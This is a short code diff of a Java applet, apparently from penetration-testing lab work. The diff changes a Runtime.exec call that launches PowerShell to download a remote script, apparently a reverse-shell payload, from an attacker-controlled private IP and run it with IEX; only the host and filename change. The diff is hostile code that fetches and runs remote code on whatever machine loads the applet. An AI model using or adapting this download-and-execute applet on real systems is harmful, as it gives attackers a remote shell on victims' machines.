@@ -34,7 +34,7 @@ public class Java extends Applet {
                 }
                 out.flush();
                 out.close(); in .close();
-                f = Runtime.getRuntime().exec("cmd.exe /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/rev1.ps1')");
+                f = Runtime.getRuntime().exec("cmd.exe /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.11.0.222/rev.txt')");
             }
         } catch (IOException e) {
             e.printStackTrace();
